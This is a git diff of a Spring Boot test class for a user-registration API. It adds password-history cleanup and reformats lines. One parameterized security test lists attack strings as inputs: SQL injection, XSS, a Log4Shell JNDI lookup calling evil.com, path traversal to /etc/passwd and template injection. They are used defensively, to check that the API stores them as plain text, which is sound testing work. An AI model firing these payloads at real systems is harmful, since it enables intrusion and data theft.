@@ -28,12 +28,14 @@ import com.digitalsanctuary.spring.demo.UserDemoApplication;
 import com.digitalsanctuary.spring.user.dto.UserDto;
 import com.digitalsanctuary.spring.user.mail.MailService;
 import com.digitalsanctuary.spring.user.persistence.model.User;
+import com.digitalsanctuary.spring.user.persistence.repository.PasswordHistoryRepository;
 import com.digitalsanctuary.spring.user.persistence.repository.UserRepository;
 import com.digitalsanctuary.spring.user.service.UserService;
 import com.fasterxml.jackson.databind.ObjectMapper;
 
 /**
- * Edge case and security tests for user registration API. This test class focuses on testing extreme inputs, security scenarios, and concurrent
+ * Edge case and security tests for user registration API. This test class
+ * focuses on testing extreme inputs, security scenarios, and concurrent
  * access patterns.
  */
 @SpringBootTest(classes = UserDemoApplication.class)
@@ -58,11 +60,16 @@ class UserRegistrationEdgeCaseTest {
     @Autowired
     private UserService userService;
 
+    @Autowired
+    private PasswordHistoryRepository passwordHistoryRepository;
+
     @MockitoBean
     private MailService mailService;
 
     @BeforeEach
     void setUp() {
+        // Clean up
+        passwordHistoryRepository.deleteAll();
         userRepository.deleteAll();
     }
 
@@ -75,7 +82,8 @@ class UserRegistrationEdgeCaseTest {
         String longString = "a".repeat(255);
         UserDto userDto = createValidUserDto("longname@example.com", longString, longString);
 
-        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON).content(objectMapper.writeValueAsString(userDto)).with(csrf()))
+        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON)
+                .content(objectMapper.writeValueAsString(userDto)).with(csrf()))
                 .andExpect(status().isOk()).andExpect(jsonPath("$.success").value(true));
 
         User savedUser = userRepository.findByEmail("longname@example.com");
@@ -89,7 +97,8 @@ class UserRegistrationEdgeCaseTest {
     void shouldHandleSpecialCharactersInNames() throws Exception {
         UserDto userDto = createValidUserDto("special@example.com", "José-María", "O'Connor-Smith");
 
-        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON).content(objectMapper.writeValueAsString(userDto)).with(csrf()))
+        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON)
+                .content(objectMapper.writeValueAsString(userDto)).with(csrf()))
                 .andExpect(status().isOk()).andExpect(jsonPath("$.success").value(true));
 
         User savedUser = userRepository.findByEmail("special@example.com");
@@ -103,7 +112,8 @@ class UserRegistrationEdgeCaseTest {
     void shouldHandleUnicodeCharacters() throws Exception {
         UserDto userDto = createValidUserDto("unicode@example.com", "北京", "Москва");
 
-        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON).content(objectMapper.writeValueAsString(userDto)).with(csrf()))
+        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON)
+                .content(objectMapper.writeValueAsString(userDto)).with(csrf()))
                 .andExpect(status().isOk()).andExpect(jsonPath("$.success").value(true));
 
         User savedUser = userRepository.findByEmail("unicode@example.com");
@@ -118,7 +128,8 @@ class UserRegistrationEdgeCaseTest {
         // Test email with dots and plus sign (valid per RFC)
         UserDto userDto = createValidUserDto("test.user+tag@sub.example.com", "Test", "User");
 
-        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON).content(objectMapper.writeValueAsString(userDto)).with(csrf()))
+        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON)
+                .content(objectMapper.writeValueAsString(userDto)).with(csrf()))
                 .andExpect(status().isOk()).andExpect(jsonPath("$.success").value(true));
 
         User savedUser = userRepository.findByEmail("test.user+tag@sub.example.com");
@@ -128,8 +139,9 @@ class UserRegistrationEdgeCaseTest {
     // ========== SECURITY TESTS ==========
 
     @ParameterizedTest
-    @ValueSource(strings = {"'; DROP TABLE users; --", "admin'--", "1' OR '1'='1", "<script>alert('xss')</script>", "javascript:alert(1)",
-            "${jndi:ldap://evil.com/a}", "../../../etc/passwd", "{{7*7}}", "%{(#_='multipart/form-data')}",})
+    @ValueSource(strings = { "'; DROP TABLE users; --", "admin'--", "1' OR '1'='1", "<script>alert('xss')</script>",
+            "javascript:alert(1)",
+            "${jndi:ldap://evil.com/a}", "../../../etc/passwd", "{{7*7}}", "%{(#_='multipart/form-data')}", })
     @DisplayName("Should safely handle potentially malicious input")
     void shouldHandleMaliciousInput(String maliciousInput) throws Exception {
         // Use a unique email for each test to avoid conflicts
@@ -140,7 +152,8 @@ class UserRegistrationEdgeCaseTest {
         // but should never execute malicious code
         MvcResult result = mockMvc
                 .perform(
-                        post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON).content(objectMapper.writeValueAsString(userDto)).with(csrf()))
+                        post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON)
+                                .content(objectMapper.writeValueAsString(userDto)).with(csrf()))
                 .andReturn();
 
         // If successful, verify the input was stored safely as plain text
@@ -162,7 +175,8 @@ class UserRegistrationEdgeCaseTest {
         UserDto userDto = createValidUserDto("csrf@example.com", "Test", "User");
 
         // Request without CSRF token should be forbidden
-        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON).content(objectMapper.writeValueAsString(userDto)))
+        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON)
+                .content(objectMapper.writeValueAsString(userDto)))
                 .andExpect(status().isForbidden());
     }
 
@@ -233,7 +247,8 @@ class UserRegistrationEdgeCaseTest {
         userDto.setPassword("ValidPassword123!");
         // matchingPassword is null
 
-        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON).content(objectMapper.writeValueAsString(userDto)).with(csrf()))
+        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON)
+                .content(objectMapper.writeValueAsString(userDto)).with(csrf()))
                 .andExpect(status().is5xxServerError());
     }
 
@@ -242,7 +257,8 @@ class UserRegistrationEdgeCaseTest {
     void shouldHandleEmptyStrings() throws Exception {
         UserDto userDto = createValidUserDto("empty@example.com", "", "");
 
-        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON).content(objectMapper.writeValueAsString(userDto)).with(csrf()))
+        mockMvc.perform(post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON)
+                .content(objectMapper.writeValueAsString(userDto)).with(csrf()))
                 .andExpect(status().is5xxServerError());
     }
 
@@ -253,7 +269,8 @@ class UserRegistrationEdgeCaseTest {
 
         MvcResult result = mockMvc
                 .perform(
-                        post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON).content(objectMapper.writeValueAsString(userDto)).with(csrf()))
+                        post(REGISTRATION_URL).contentType(MediaType.APPLICATION_JSON)
+                                .content(objectMapper.writeValueAsString(userDto)).with(csrf()))
                 .andReturn();
 
         // API might accept or reject whitespace - either is valid
